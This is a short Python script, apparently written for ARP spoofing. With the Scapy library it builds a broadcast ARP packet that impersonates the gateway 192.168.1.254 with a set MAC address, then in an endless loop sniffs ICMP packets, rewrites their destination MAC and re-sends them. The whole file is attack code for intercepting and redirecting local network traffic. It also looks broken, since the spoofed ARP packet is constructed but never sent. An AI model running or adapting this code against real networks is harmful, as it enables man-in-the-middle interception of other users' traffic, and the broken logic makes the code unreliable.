from scapy.all import *
import time

while(True):
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(psrc="192.168.1.254", pdst="192.168.1.254", hwsrc="ec:f4:bb:60:40:62")
    arpSend = ether/arp
    pkt = sniff(filter="icmp",count=1)
    toSend = pkt[0]
    toSend[Ether].dst = "00:c8:8b:6d:71:e0"
    toSend.show()
    sendp(toSend, iface="eth0")

